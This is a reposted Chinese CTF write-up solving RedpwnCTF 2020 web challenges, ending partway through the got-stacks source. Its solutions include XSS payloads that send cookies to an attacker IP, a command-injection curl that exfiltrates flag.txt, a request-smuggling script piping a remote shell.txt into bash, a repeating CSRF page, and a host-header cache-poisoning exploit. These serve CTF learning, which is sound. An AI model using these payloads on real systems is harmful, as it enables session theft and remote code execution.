> 原文链接: https://www.anquanke.com//post/id/209776 


# RedpwnCTF 2020 Web Writeup


                                阅读量   
                                **160368**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">8</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t010233a5cfd3589c78.png)](https://p4.ssl.qhimg.com/t010233a5cfd3589c78.png)

> <p>国外的一场比赛，好多题没写出来，赛后这几天从github上下了dockerfile 复现学习一下。web题很新颖，基本上都是nodejs写成，且除几个题外都给了源码，收获满满。<br>
ps. 复现的时候官方环境还没关</p>
[https://github.com/redpwn/redpwnctf-2020-challenges](https://github.com/redpwn/redpwnctf-2020-challenges)

## web/static-pastebin

> I wanted to make a website to store bits of text, but I don’t have any experience with web development. However, I realized that I don’t need any! If you experience any issues, make a paste and send it [here](https://admin-bot.redpwnc.tf/submit?challenge=static-pastebin)
Site: [static-pastebin.2020.redpwnc.tf](https://static-pastebin.2020.redpwnc.tf/)
Note: The site is entirely static. Dirbuster will not be useful in solving it.

题目描述给了两个网址，一个类似代码高亮的纯静态页，一个提交网址xssbot会访问的网站，可以初步判断为xss打cookie

纯静态页面的话可以分析下js是这么过滤的

```
(async () =&gt; `{`
    await new Promise((resolve) =&gt; `{`
        window.addEventListener('load', resolve);
    `}`);

    const content = window.location.hash.substring(1);
    display(atob(content));
`}`)();

function display(input) `{`
    document.getElementById('paste').innerHTML = clean(input);
`}`

function clean(input) `{`
    let brackets = 0;
    let result = '';
    for (let i = 0; i &lt; input.length; i++) `{`
        const current = input.charAt(i);
        if (current == '&lt;') `{`
            brackets ++;
        `}`
        if (brackets == 0) `{`
            result += current;
        `}`
        if (current == '&gt;') `{`
            brackets --;
        `}`
    `}`
    return result
`}`
```

可以看出对`&lt;&gt;`包裹的会被过滤，单是先传入`&gt;`会导致 `brackets=-1`,后面传入`&lt; brackets=0`就不会被过滤

```
&gt;&lt;img src=x onerror=alert("ddddddhm");&gt;
// 打cookie
&gt;&lt;img src=x onerror=window.location.href='https://ip/?c='+document.cookie;&gt;
```

可以用python开一个服务或nc收cookie

[![](https://s1.ax1x.com/2020/06/30/NIrEb4.png)](https://s1.ax1x.com/2020/06/30/NIrEb4.png)

## web/panda-facts

> I just found a hate group targeting my favorite animal. Can you try and find their secrets? We gotta take them down!
Site: [panda-facts.2020.redpwnc.tf](https://panda-facts.2020.redpwnc.tf/)

输入用户名即可登陆，登陆后提示 You are not a member

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/06/30/NIfmIU.png)

给了源码，瞧下源码

```
global.__rootdir = __dirname;

const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const path = require('path');
const crypto = require('crypto');

require('dotenv').config();

const INTEGRITY = '12370cc0f387730fb3f273e4d46a94e5';

const app = express();

app.use(bodyParser.json(`{` extended: false `}`));
app.use(cookieParser());

app.post('/api/login', async (req, res) =&gt; `{`
    if (!req.body.username || typeof req.body.username !== 'string') `{`
        res.status(400);
        res.end();
        return;
    `}`
    res.json(`{`'token': await generateToken(req.body.username)`}`);
    res.end;
`}`);

app.get('/api/validate', async (req, res) =&gt; `{`
    if (!req.cookies.token || typeof req.cookies.token !== 'string') `{`
        res.json(`{`success: false, error: 'Invalid token'`}`);
        res.end();
        return;
    `}`

    const result = await decodeToken(req.cookies.token);
    if (!result) `{`
        res.json(`{`success: false, error: 'Invalid token'`}`);
        res.end();
        return;
    `}`

    res.json(`{`success: true, token: result`}`);
`}`);

app.get('/api/flag', async (req, res) =&gt; `{`
    if (!req.cookies.token || typeof req.cookies.token !== 'string') `{`
        res.json(`{`success: false, error: 'Invalid token'`}`);
        res.end();
        return;
    `}`

    const result = await decodeToken(req.cookies.token);
    if (!result) `{`
        res.json(`{`success: false, error: 'Invalid token'`}`);
        res.end();
        return;
    `}`

    if (!result.member) `{`
        res.json(`{`success: false, error: 'You are not a member'`}`);
        res.end();
        return;
    `}`

    res.json(`{`success: true, flag: process.env.FLAG`}`);
`}`);

app.use(express.static(path.join(__dirname, '/public')));

app.listen(process.env.PORT || 3000);

async function generateToken(username) `{`
    const algorithm = 'aes-192-cbc'; 
    const key = Buffer.from(process.env.KEY, 'hex'); 
    // Predictable IV doesn't matter here
    const iv = Buffer.alloc(16, 0);

    const cipher = crypto.createCipheriv(algorithm, key, iv);

    const token = ``{`"integrity":"$`{`INTEGRITY`}`","member":0,"username":"$`{`username`}`"`}``

    let encrypted = '';
    encrypted += cipher.update(token, 'utf8', 'base64');
    encrypted += cipher.final('base64');
    return encrypted;
`}`

async function decodeToken(encrypted) `{`
    const algorithm = 'aes-192-cbc'; 
    const key = Buffer.from(process.env.KEY, 'hex'); 
    // Predictable IV doesn't matter here
    const iv = Buffer.alloc(16, 0);
    const decipher = crypto.createDecipheriv(algorithm, key, iv);

    let decrypted = '';

    try `{`
        decrypted += decipher.update(encrypted, 'base64', 'utf8');
        decrypted += decipher.final('utf8');
    `}` catch (error) `{`
        return false;
    `}`

    let res;
    try `{`
        res = JSON.parse(decrypted);
    `}` catch (error) `{`
        console.log(error);
        return false;
    `}`

    if (res.integrity !== INTEGRITY) `{`
        return false;
    `}`

    return res;
`}`
```

关注到这一行

```
const token = ``{`"integrity":"$`{`INTEGRITY`}`","member":0,"username":"$`{`username`}`"`}``
```

把member伪造成1应该可以得到flag，token aes-192-cbc加密加密生成，也不知道密匙,因为密匙在环境变量中

```
const key = Buffer.from(process.env.KEY, 'hex');
```

引入一个小知识点 JSON parsers会用最后一个值，也就是要是能在后面再构造一个为1的member就能覆盖掉

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/06/30/NI4eCF.png)

token哪username可控，尝试注入传入`gg","member":1,"a":"`,最后token变为 ``{`"integrity":"1","member":0,"username":"gg","member":1,"a":""`}`` ，flag到手

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/06/30/NI5EqI.png)

## web/static-static-hosting

> Seeing that my last website was a success, I made a version where instead of storing text, you can make your own custom websites! If you make something cool, send it to me [here](https://admin-bot.redpwnc.tf/submit?challenge=static-static-hosting)
Site: [static-static-hosting.2020.redpwnc.tf](https://static-static-hosting.2020.redpwnc.tf/)
Note: The site is entirely static. Dirbuster will not be useful in solving it.

上面那题xss的升级版，也能看过滤的js代码

```
(async () =&gt; `{`
    await new Promise((resolve) =&gt; `{`
        window.addEventListener('load', resolve);
    `}`);

    const content = window.location.hash.substring(1);
    display(atob(content));
`}`)();

function display(input) `{`
    document.documentElement.innerHTML = clean(input);
`}`

function clean(input) `{`
    const template = document.createElement('template');
    const html = document.createElement('html');
    template.content.appendChild(html);
    html.innerHTML = input;

    sanitize(html);

    const result = html.innerHTML;
    return result;
`}`

function sanitize(element) `{`
    const attributes = element.getAttributeNames();
    for (let i = 0; i &lt; attributes.length; i++) `{`
        // Let people add images and styles
        if (!['src', 'width', 'height', 'alt', 'class'].includes(attributes[i])) `{`
            element.removeAttribute(attributes[i]);
        `}`
    `}`

    const children = element.children;
    for (let i = 0; i &lt; children.length; i++) `{`
        if (children[i].nodeName === 'SCRIPT') `{`
            element.removeChild(children[i]);
            i --;
        `}` else `{`
            sanitize(children[i]);
        `}`
    `}`
`}`
```

标签属性只能带`'src', 'width', 'height', 'alt', 'class'`,其他的属性全部移除掉，可以利用`iframe`构造

```
&lt;iframe src="javascript:alert(1)"&gt;

&lt;iframe src="javascript:top.location.href='http://ip/?c='+document.cookie"&gt;

```

和上面一样传过去就有flag了

flag`{`wh0_n33d5_d0mpur1fy`}`

ps .在这里用window.location、self、this失败了，猜是不许页面内引入。 除了top还可以用parent代替

## web/tux-fanpage

> My friend made a fanpage for Tux; can you steal the source code for me?
Site: [tux-fanpage.2020.redpwnc.tf](https://tux-fanpage.2020.redpwnc.tf/)

给了源码

```
const express = require('express')
const path = require('path')
const app = express()

//Don't forget to redact from published source
const flag = '[REDACTED]'

app.get('/', (req, res) =&gt; `{`
    res.redirect('/page?path=index.html')
`}`)

app.get('/page', (req, res) =&gt; `{`

    let path = req.query.path

    //Handle queryless request
    if(!path || !strip(path))`{`
        res.redirect('/page?path=index.html')
        return
    `}`

    path = strip(path)

    path = preventTraversal(path)

    res.sendFile(prepare(path), (err) =&gt; `{`
        if(err)`{`
            if (! res.headersSent) `{`
                try `{`
                    res.send(strip(req.query.path) + ' not found')
                `}` catch `{`
                    res.end()
                `}`
            `}`
        `}`
    `}`)
`}`)

//Prevent directory traversal attack
function preventTraversal(dir)`{`
    if(dir.includes('../'))`{`
        let res = dir.replace('../', '')
        return preventTraversal(res)
    `}`

    //In case people want to test locally on windows
    if(dir.includes('..\'))`{`
        let res = dir.replace('..\', '')
        return preventTraversal(res)
    `}`
    return dir
`}`

//Get absolute path from relative path
function prepare(dir)`{`
    return path.resolve('./public/' + dir)
`}`

//Strip leading characters
function strip(dir)`{`
    const regex = /^[a-z0-9]$/im

    //Remove first character if not alphanumeric
    if(!regex.test(dir[0]))`{`
        if(dir.length &gt; 0)`{`
            return strip(dir.slice(1))
        `}`
        return ''
    `}`

    return dir
`}`

app.listen(3000, () =&gt; `{`
    console.log('listening on 0.0.0.0:3000')
`}`)

```

要求读文件，但是又很多过滤，一个一个看,首先是这个strip

```
//Strip leading characters
function strip(dir)`{`
    const regex = /^[a-z0-9]$/im

    //Remove first character if not alphanumeric
    if(!regex.test(dir[0]))`{`
        if(dir.length &gt; 0)`{`
            return strip(dir.slice(1))
        `}`
        return ''
    `}`

    return dir
`}`
```

传入字符的时候没影响，但是传入数组的时候情况有不同

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/07/01/NTkUm9.png)

数组第一个为单个字符就可以过

看preventTraversal()

```
function preventTraversal(dir)`{`
    if(dir.includes('../'))`{`
        let res = dir.replace('../', '')
        return preventTraversal(res)
    `}`

    //In case people want to test locally on windows
    if(dir.includes('..\'))`{`
        let res = dir.replace('..\', '')
        return preventTraversal(res)
    `}`
    return dir
`}`

```

include 对字符和数组的结果有不同之处

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/07/01/NTKum8.png)

传入数组的话就可以绕过过滤，想办法构造一个`/../../index.js`赋值给path就能读flag。`path.resolve()`，会有一个字符串拼接，如果传入数组，字符串+数组也为字符串。

```
payload: ?path[]=a&amp;path[]=/../../index.js
```

拼接起来是 path=”./public/a,/../../index.js”

flag到手

```
const flag = 'flag`{`tr4v3rsal_Tim3`}`'
```

## web/post-it-notes

> Request smuggling has many meanings. Prove you understand at least one of them at [2020.redpwnc.tf:31957](http://2020.redpwnc.tf:31957/).
Note: There are a lot of time-wasting things about this challenge. Focus on finding the vulnerability on the backend API and figuring out how to exploit it.

给了源码，看到api/server.py中

```
def get_note(nid):
    stdout, stderr = subprocess.Popen(f"cat 'notes/`{`nid`}`' || echo it did not work btw", shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE).communicate()
    if stderr:
        print(stderr) # lemonthink
        return `{``}`
    return `{`
        'success' : True,
        'title' : nid,
        'contents' : stdout.decode('utf-8', errors = 'ignore')
    `}`
```

很明显有命令注入，nid是由web/server.py中`/notes/&lt;nid&gt;`传入

`payload：/notes/x';curl ip --data [@flag](https://github.com/flag).txt;'`

尝试了很多直接反弹shell的payload，最后base64一下才成功反弹成功

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/07/02/NqFIdH.png)

还有一种做法是ssrf+http走私,但是我复现的时候没成功

web运行在外网，api是运行在内网且端口未知，端口在50000-51000

```
if __name__ == '__main__':
    backend_port = random.randint(50000, 51000)

    at = threading.Thread(target = api_server.start, args = (backend_port,))
    wt = threading.Thread(target = web_server.start, args = (backend_port,))
```

`check_link()`可以探测内网，知道端口号后就可以走私，这里借用y1ng师傅的脚本

```
# 探测端口
import requests as req
url = "http://2020.redpwnc.tf:31957/check-links"
data = `{`"links":""`}`
for i in range(50000,51000):
    api = "http://localhost:`{``}`".format(i)
    data["link"] = api
    r = req.post(url, data=data)
    if r"true" in r.text:
        print("success:"+str(i))
        break

# 走私，命令执行
#!/usr/bin/env python3
#-*- coding:utf-8 -*-
#__author__: 颖奇L'Amore www.gem-love.com
import requests as req
from urllib.parse import quote as urlen

url = "http://2020.redpwnc.tf:31957/check-links"
#bash中用#把后面的命令过滤掉
smuggling = "http://127.0.0.1rnrnGET /api/v1/notes/?title=" + urlen("';curl http://gem-love.com/shell.txt|bash #") + " HTTP/1.1rnrn:50596"

data = `{`"links":smuggling`}`
req.post(url, data=data)
```

## web/cookie-recipes-v2

> I want to buy some of these recipes, but they are awfully expensive. Can you take a look?
Site: [cookie-recipes-v2.2020.redpwnc.tf](https://cookie-recipes-v2.2020.redpwnc.tf/)

登陆进去是一个商店，可以买flag，账户里有的积分不出所料的不够。有一个可以拿积分的地方，可以提交一个url

[![](https://s1.ax1x.com/2020/07/02/NL0Hvn.png)](https://s1.ax1x.com/2020/07/02/NL0Hvn.png)

到这里就没什么思路了，给了源码,源码中有很多api接口，列出后面用到的几个

api/getId 获取当前用户ID

api/userInfo 获取用户信息，能看到密码

api/gift 送积分

详细看gift的代码

```
// Make sure request is from admin
        try `{`
            if (!database.isAdmin(id)) `{`
                res.writeHead(403);
                res.end();
                return;
            `}`
        `}` catch (error) `{`
            res.writeHead(500);
            res.end();
            return;
        `}`
// Make sure user has not already received a gift
        try `{`
            if (database.receivedGift(user_id)) `{`
                util.respondJSON(res, 200, result); 
                return;
            `}`
        `}` catch (error) `{`
            res.writeHead(500);
            res.end();
            return;
        `}`

// Check admin password to prevent CSRF
        let body;
        try `{`
            body = await util.parseRequest(req);
        `}` catch (error) `{`
            res.writeHead(400);
            res.end();
            return;
        `}`
// User can only receive one gift
        try `{`
            database.setReceived(user_id);
        `}` catch (error) `{`
            res.writeHead(500);
            res.end();
        `}`
```

要求是管理员，在送的时候需要输入管理员的密码，且只能一次队伍送一次，我们可以从

```
https://cookie-recipes-v2.2020.redpwnc.tf/api/userInfo?id=0
```

得到管理员密码，尝试登陆显示`IP address not allowed`,那只能通过url输入的地方尝试csrf，构造数据包应该是这样

```
POST /api/gift?id=1141126652894855019 HTTP/1.1
Host: cookie-recipes-v2.2020.redpwnc.tf
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: text/plain
Content-Length: 47
Connection: close

`{`"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn"`}`

```

id从`/api/userInfo`获取，需要发送json，从老外wp上学一手用xml构造csrf

```
&lt;html&gt;&lt;script&gt;
    async function jsonreq() `{`
        var xhr = new XMLHttpRequest()
        xhr.open("POST","https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=1141126652894855019", true);
        xhr.withCredentials = true;
        xhr.setRequestHeader("Content-Type","text/plain");
        xhr.send(JSON.stringify(`{`"password":"n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn"`}`));
    `}`
    for (var i = 0; i &lt; 1000; i++) `{`
        jsonreq();
    `}`
&lt;/script&gt;&lt;/html&gt;
```

因为只能送一次积分，所以重复发尝试绕过这个限制。把这个页面放自己服务器，可以用python起服务，直接访问

```
python -m SimpleHTTPServer 4040
```

提交 `ip:4040/csrf.html`,发过去后查看自己的账号有足够的积分，买flag美滋滋

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/07/03/NLg7nJ.png)

ps.这题还有非预期，直接跨目录读/app/.env

```
curl --path-as-is https://cookie-recipes-v2.2020.redpwnc.tf/../../../../app/.env
```

## web/Viper

> Don’t you want your own ascii viper? No? Well here is Viper as a Service. If you experience any issues, send it [here](https://admin-bot.redpwnc.tf/submit?challenge=viper)
NOTE: The admin bot will only accept websites which match the following regex: `^http://2020.redpwnc.tf:31291/viper/[0-9a-f-]+$`
Site: [2020.redpwnc.tf:31291](http://2020.redpwnc.tf:31291/)

这题涨知识了！老外真骚

进去之后可以点击create创建个人页面，然后就没有什么有价值的东西了，给了源码

```
"use strict";

/*
 *  @REDPWNCTF 2020
 *  @AUTHOR Jim
 */

const express = require("express");
const bodyParser = require("body-parser");
const session = require('express-session');
const redis = require('redis');
const redisStore = require('connect-redis')(session);
const mcache = require('memory-cache');
const `{` v4: uuidv4 `}` = require('uuid');
const fs = require("fs");

const app = express();
const client  = redis.createClient('redis://redis:6379');

app.use(express.static(__dirname + "/public"));
app.use(bodyParser.json());
app.use(session(`{`
    secret: 'REDACTED', // README it's not literally REDACTED on server
    store: new redisStore(`{` host: 'redis', port: 6379, client: client`}`),
    saveUninitialized: false,
    resave: false
`}`));
app.use(function(req, res, next) `{`
    res.setHeader("Content-Security-Policy", "default-src 'self'");
    res.setHeader("X-Frame-Options", "DENY")
    return next();
`}`);
app.set('view engine', 'ejs');

const middleware = (duration) =&gt; `{`
    return(req, res, next) =&gt; `{`
        const key = '__rpcachekey__|' + req.originalUrl + req.headers['host'].split(':')[0];
        let cachedBody = mcache.get(key);
        if(cachedBody)`{`
            res.send(cachedBody);
            return;
        `}`else`{`
            res.sendResponse = res.send;
            res.send = (body) =&gt; `{`
                mcache.put(key, body, duration * 1000);
                res.sendResponse(body);
            `}`
            next();
        `}`
    `}`
`}`;

app.get('/create', function (req, res) `{`
    let sess = req.session;

    if(!sess.viperId)`{`
        const newViperId = uuidv4();

        sess.viperId = newViperId;
        sess.viperName = newViperId;
    `}`
    res.redirect('/viper/' + encodeURIComponent(sess.viperId));
`}`);

app.get('/', function(req, res) `{`
    res.render('pages/index');
`}`);

app.get('/viper/:viperId', middleware(20), function (req, res) `{`
    let viperId = req.params.viperId;
    let sess = req.session;

    const sessViperId = sess.viperId;
    const sessviperName = sess.viperName;

    if(sess.isAdmin)`{`
        sess.viperId = "admin_account";
        sess.viperName = "admin_account";
    `}`

    if(viperId === sessViperId || sess.isAdmin)`{`
        res.render('pages/viper', `{`
            name: sessviperName,
            analyticsUrl: 'http://' + req.headers['host'] + '/analytics?ip_address=' + req.headers['x-real-ip']
        `}`);
    `}`else`{`
        res.redirect('/');
    `}`
`}`);

app.get('/editviper', function (req, res) `{`
    let viperName = req.query.viperName;
    let sess = req.session;

    if(sess.viperId)`{`
        sess.viperName = viperName;
        res.redirect('/viper/' + encodeURIComponent(sess.viperId));
    `}`else`{`
        res.redirect('/');
    `}`
`}`);

app.get('/logout', function (req, res) `{`
    let sess = req.session;

    sess.destroy();

    res.redirect('/');
`}`);

app.get('/analytics', function (req, res) `{`
    const ip_address = req.query.ip_address;

    if(!ip_address)`{`
        res.status(400).send("Bad request body");
        return;
    `}`

    client.exists(ip_address, function(err, reply) `{`
        if (reply === 1) `{`
            client.incr(ip_address, function(err, reply) `{`
                if(err)`{`
                    res.status(500).send("Something went wrong");
                    return;
                `}`
                res.status(200).send("Success! " + ip_address + " has visited the site " + reply + " times.");
            `}`);
        `}` else `{`
            client.set(ip_address, 1, function(err, reply) `{`
                if(err)`{`
                    res.status(500).send("Something went wrong");
                    return;
                `}`
                res.status(200).send("Success! " + ip_address + " has visited the site 1 time.");
            `}`);
        `}`
    `}`);
 `}`);

 // README: This is the code used to generate the cookie stored on the admin user

 app.get('/admin/generate/:secret_token', function(req, res) `{`
    const secret_token = "REDACTED"; // README it's not literally READACTED on chall server

    if(req.params.secret_token === secret_token)`{`
        let sess = req.session;

        sess.viperId = "admin_account";
        sess.viperName = "admin_account";
        sess.isAdmin = true;
    `}`

    res.redirect('/');
 `}`);

 const getRandomInt = (min, max) =&gt; `{`
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min + 1)) + min;
 `}`;

 app.get('/admin', function (req, res) `{`
    let sess = req.session;

    if(sess.isAdmin)`{`
        client.exists('__csrftoken__' + sess.viperId, function(err, reply) `{`
            if(err)`{`
                res.status(500).send("Something went wrong");
                return;
            `}`
            if (reply === 1) `{`
                client.get('__csrftoken__' + sess.viperId, function(err, reply) `{`
                    if(err)`{`
                        res.status(500).send("Something went wrong");
                        return;
                    `}`
                    res.render('pages/admin', `{`
                        csrfToken: Buffer.from(reply).toString('base64')
                    `}`);
                `}`);
            `}` else `{`
                const randomToken = getRandomInt(10000, 1000000000);
                client.set('__csrftoken__' + sess.viperId, randomToken, function(err, reply) `{`
                    if(err)`{`
                        res.status(500).send("Something went wrong");
                        return;
                    `}`
                    res.render('pages/admin', `{`
                        csrfToken: Buffer.from(randomToken).toString('base64')
                    `}`);
                `}`);
            `}`
        `}`);
    `}`else`{`
        res.redirect('/');
    `}`
 `}`);

 app.get('/admin/create', function(req, res) `{`
    let sess = req.session;
    let viperId = req.query.viperId;
    let csrfToken = req.query.csrfToken;

    const v4regex = new RegExp("^[0-9A-F]`{`8`}`-[0-9A-F]`{`4`}`-4[0-9A-F]`{`3`}`-[89AB][0-9A-F]`{`3`}`-[0-9A-F]`{`12`}`$", "i");
    if(!viperId.match(v4regex))`{`
        res.status(400).send("Bad request body");
        return;
    `}`

    if(!viperId || !csrfToken)`{`
        res.status(400).send("Bad request body");
        return;
    `}`

    if(sess.isAdmin)`{`
        client.exists('__csrftoken__' + sess.viperId, function(err, reply) `{`
            if(err)`{`
                res.status(500).send("Something went wrong");
                return;
            `}`
            if (reply === 1) `{`
                client.get('__csrftoken__' + sess.viperId, function(err, reply) `{`
                    if(err)`{`
                        res.status(500).send("Something went wrong");
                        return;
                    `}`
                    if(reply === Buffer.from(csrfToken, 'base64').toString('ascii'))`{`
                        const randomToken = getRandomInt(1000000, 10000000000);
                        client.set('__csrftoken__' + sess.viperId, randomToken, function(err, reply) `{`
                            if(err)`{`
                                res.status(500).send("Something went wrong");
                                return;
                            `}`
                        `}`);

                        sess.viperId = viperId;
                        sess.viperName = fs.readFileSync('./flag.txt').toString();

                        res.redirect('/viper/' + encodeURIComponent(sess.viperId));
                    `}`else`{`
                        res.status(401).send("Unauthorized");
                    `}`
                `}`);
            `}` else `{`
                res.status(401).send("Unauthorized");
            `}`
        `}`);
    `}`else`{`
        res.redirect('/');
    `}`
 `}`);

app.listen(31337, () =&gt; `{`
    console.log("express listening on 31337");
`}`);
```

可以看到获取flag需要`app.get('/admin/create', function(req, res)`需要这个路由创建一个页面，把读取的flag.txt放入`viperName`。访问[http://2020.redpwnc.tf:31291/viper/+](http://2020.redpwnc.tf:31291/viper/+) 对应的viperId,就能看到flag。但是这个路由只能admin访问，所以考虑能不能xss让admin访问这个页面，题目描述上给 机器人的地址且说明了只接受`^http://2020.redpwnc.tf:31291/viper/[0-9a-f-]+$`这样的地址，也就是我们创建的页面，从中看看有没有利用点。

源码中viper.ejs（EJS 是一套简单的模板语言，帮你利用普通的 JavaScript 代码生成 HTML 页面。），也就是页面的模板中两个地方是可变的地方`&lt;%= name %&gt;  &lt;%- analyticsUrl %&gt;`。

在ejs中，参考 [https://ejs.bootcss.com/#install](https://ejs.bootcss.com/#install)

`&lt;%=` 输出数据到模板（输出是转义 HTML 标签）

`&lt;%-` 输出非转义的数据到模板

也就是name会被转义，analyticsUrl不会，所以analyticsUrl可能会有xss

```
analyticsUrl: 'http://' + req.headers['host'] + '/analytics?ip_address=' + req.headers['x-real-ip']
```

analyticsUrl由`req.headers['host']`传入，要怎么构造捏

我们需要xss让admin访问`http://2020.redpwnc.tf:31291/admin/create?viperId=`{``}`&amp;csrfToken=`{``}``也就是需要把这个构造到host里面，有几个坑
<li>
`/`不能传入host</li>
<li>
`csrfToken`未知</li>
1. 有csp
<li>
`&amp;`被html编码</li>
第一个直接用反斜杠代替就好，需要传入的`csrfToken`，访问`http://2020.redpwnc.tf:31291/analytics?ip_address=__csrftoken__admin_account`获取数字base64加密后就是`csrfToken`。绕csp的话可以利用`analytics.js`,只有一行

```
fetch(document.getElementById("analyticsUrl").innerHTML)
```

fetch可以请求网址，正好可以用来csrf。最后因为要传两个参需要`&amp;`,但是`innerHTML`提取时`&amp;`会被解析，使用注释符号包裹`innerHTML`提取就不会解析`&amp;`了。

最后构造的host

```
Host: 2020.redpwnc.tf:31291admincreate?x=&lt;!--&amp;viperId=AAAAAAAA-AAAA-4AAA-8AAA-AAAAAAAAAAAA&amp;csrfToken=&lt;BASE64 encoded token&gt;#--&gt;
```

exp

```
#!/usr/bin/env python3
import requests, socket, re
import uuid
from urllib.parse import quote
from base64 import b64encode

HOST, PORT = "2020.redpwnc.tf", 31291
#HOST, PORT = "localhost", 31337

ADMIN_VIPER = str(uuid.uuid4())

# Create new viper and fetch cookie and Viper ID
r = requests.get("http://`{``}`:`{``}`/create".format(HOST,PORT), allow_redirects=False)
viper_id = re.findall("([a-f0-9]`{`8`}`-[a-f0-9]`{`4`}`-[a-f0-9]`{`4`}`-[a-f0-9]`{`4`}`-[a-f0-9]`{`12`}`)", r.text)[0]
sessid = r.cookies["connect.sid"]
cookies = `{`"connect.sid" : sessid`}`

# Get the csrf token
r = requests.get("http://`{``}`:`{``}`/analytics?ip_address=__csrftoken__admin_account".format(HOST, PORT))
csrftoken = quote(b64encode(r.text.split()[-2].encode()))

# Inject host header
payload = ""
payload += "GET /viper/`{``}` HTTP/1.1rn".format(viper_id)
payload += "Host: `{``}`:`{``}`\admin\create?x=&lt;!--&amp;viperId=`{``}`&amp;csrfToken=`{``}`#--&gt;rn".format(HOST, PORT, ADMIN_VIPER, csrftoken)
payload += "Accept: */*rn"
payload += "Cookie: connect.sid=`{``}`rn".format(sessid)
payload += "rn"

s = socket.socket()
s.connect((HOST, PORT))
s.sendall(payload.encode())
print(s.recv(32768))
s.close()

# Cache request
r = requests.get("http://`{``}`:`{``}`/viper/`{``}`".format(HOST, PORT, viper_id), cookies=cookies)
print(r.text)

print("Send this URL to the admin")
print("http://`{``}`:`{``}`/viper/`{``}`".format(HOST, PORT, viper_id))

while True:
    input("nClick to continue fetching http://`{``}`:`{``}`/viper/`{``}` ... ".format(HOST, PORT, ADMIN_VIPER))
    r = requests.get("http://`{``}`:`{``}`/viper/`{``}`".format(HOST, PORT, ADMIN_VIPER), cookies=cookies)
    print(r.text)
```

提交网址后在访问下admin创建的页面就能看到flag了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://s1.ax1x.com/2020/07/03/Njr7OH.png)

参考: [https://ctftime.org/writeup/21819](https://ctftime.org/writeup/21819)

## web/got-stacks

> This website has great products! Thankfully there are enough products to go around; I’m tryna burn some mad stacks for you all.
Site: [got-stacks.2020.redpwnc.tf](https://got-stacks.2020.redpwnc.tf/)

题目是一个类似商品页，可以注测用户，同样也给了源码

```
"use strict";

/*
 *  @REDPWNCTF 2020
 *  @AUTHOR Jim
 */

const express = require("express");
const bodyParser = require("body-parser");
const mysql = require("mysql");
const request = require("request");
const url = require("url");
const fs = require("fs");

const conn = mysql.createConnection(`{`
    host: "127.0.0.1",
    port: "3306",
    user: "redpwnuser",
    password: "redpwnpassword",
    database: "gotstacks",
    multipleStatements: "true"
`}`);

conn.connect(`{` function(err)`{`
        if(err)`{`
            throw err;
        `}`else`{`
            console.log("mysql connection success");
        `}`
    `}`
`}`);

const KEYWORDS = [
    "union",
    "and",
    "or",
